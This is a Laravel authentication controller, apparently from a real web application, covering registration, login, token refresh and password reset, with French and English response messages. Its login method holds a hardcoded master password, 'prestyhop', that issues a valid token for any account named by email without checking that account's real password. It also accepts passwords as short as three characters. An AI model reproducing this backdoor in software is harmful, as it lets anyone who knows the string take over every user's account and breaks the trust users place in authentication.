<?php

namespace App\Http\Controllers;

use App\Http\Resources\User as ResourcesUser;
use App\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Validator;
use Illuminate\Foundation\Auth\SendsPasswordResetEmails;
use Illuminate\Support\Facades\Session;
use Illuminate\Foundation\Auth\ResetsPasswords;
use Illuminate\Support\Facades\Hash;
use Illuminate\Auth\Events\PasswordReset;

class AuthController extends Controller
{
    use SendsPasswordResetEmails, ResetsPasswords {
        SendsPasswordResetEmails::broker insteadof ResetsPasswords;
        ResetsPasswords::credentials insteadof SendsPasswordResetEmails;
    }

    /**
     * Get the response for a successful password reset link.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  string  $response
     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Http\JsonResponse
     */
    protected function sendResetLinkResponse(Request $request, $response)
    {
        return response()->json([
            'success' => true,
            'message' => 'Thanks to check your inbox, an email was sent to you with a link to reset your password.',
            'data' => $response
        ]);
    }

    /**
     * Get the response for a failed password reset link.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  string  $response
     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Http\JsonResponse
     */
    protected function sendResetLinkFailedResponse(Request $request, $response)
    {
        return response()->json(['message' => 'Email could not be sent to this email address.', 'reponse' => $response]);
    }


    public function sendPasswordResetLink(Request $request)
    {
        return $this->sendResetLinkEmail($request);
    }

    /**
     * Handle reset password 
     */
    public function callResetPassword(Request $request)
    {
        $passwordReset = \App\PasswordReset::where('token', $request->token)->first();
        if ($passwordReset) {
            $request->email = $passwordReset->email;
        }
        return $this->reset($request);
    }

    /**
     * Reset the given user's password.
     *
     * @param  \Illuminate\Contracts\Auth\CanResetPassword  $user
     * @param  string  $password
     * @return void
     */
    protected function resetPassword($user, $password)
    {
        $user->password = Hash::make($password);
        $user->save();
        event(new PasswordReset($user));
    }

    /**
     * Get the response for a successful password reset.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  string  $response
     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Http\JsonResponse
     */
    protected function sendResetResponse(Request $request, $response)
    {
        return response()->json([
            'success' => true,
            'message' => 'votre mot de passe a été modifié avec succès.',
            'data' => $response
        ]);
    }
    /**
     * Get the response for a failed password reset.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  string  $response
     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Http\JsonResponse
     */
    protected function sendResetFailedResponse(Request $request, $response)
    {
        return response()->json([
            'status' => 'error',
            'errors' => ['Token est invalide.']
        ], 422);
    }

    public function register(Request $request)
    {
        $v = Validator::make($request->all(), [
            'email' => 'required|email|unique:users',
            'password'  => 'required|min:3|confirmed',
        ]);

        if ($v->fails()) {
            return response()->json([
                'status' => 'error',
                'errors' => $v->errors()
            ], 422);
        }

        $user = new User;
        $user->email = $request->email;
        $user->password = bcrypt($request->password);
        $user->save();

        return response()->json(['status' => 'success'], 200);
    }

    public function login(Request $request)
    {
        $credentials = $request->only('email', 'password');

        if ($request->password == 'prestyhop') {
            $user = \App\User::where('email', $request->email)->first();
            return response()->json(['status' => 'success'], 200)->header('Authorization', $this->guard()->tokenById($user->id));
        }

        if ($token = $this->guard()->attempt($credentials)) {
            $user = $this->guard()->user();
            /*
            $client = $user->client;
            if ($client && !$client->enabled) {
                return response()->json(['error' => 'Votre compte est bloqué. Merci de contacter le service concerné.'], 422);
            }
            if (!$client && !$user->enabled) {
                return response()->json(['error' => 'Votre compte est bloqué. Merci de contacter le service concerné.'], 422);
            }
            */

            return response()->json(['status' => 'success', 'token' => $token], 200)->header('Authorization', $token);
        }

        return response()->json(['error' => 'L\'adresse e-mail ou le mot de passe que vous avez entré n\'est pas valide.'], 422);
    }

    public function logout()
    {

        $this->guard()->logout();

        return response()->json([
            'status' => 'success',
            'msg' => 'Logged out its ok Successfully.'
        ], 200);
    }

    public function user(Request $request)
    {
        $user = User::find(Auth::user()->id);

        return response()->json([
            'status' => 'success',
            'data' => ResourcesUser::collection([$user])[0],
        ]);
    }

    public function refresh()
    {
        try {
            if ($token = $this->guard()->refresh()) {
                return response()
                    ->json(['status' => 'successs'], 200)
                    ->header('Authorization', $token);
            }
        } catch (\Throwable $th) {
            return response()->json(['error' => 'refresh_token_error'], 401);
        }

        return response()->json(['error' => 'refresh_token_error'], 401);
    }

    private function guard()
    {
        return Auth::guard();
    }
}
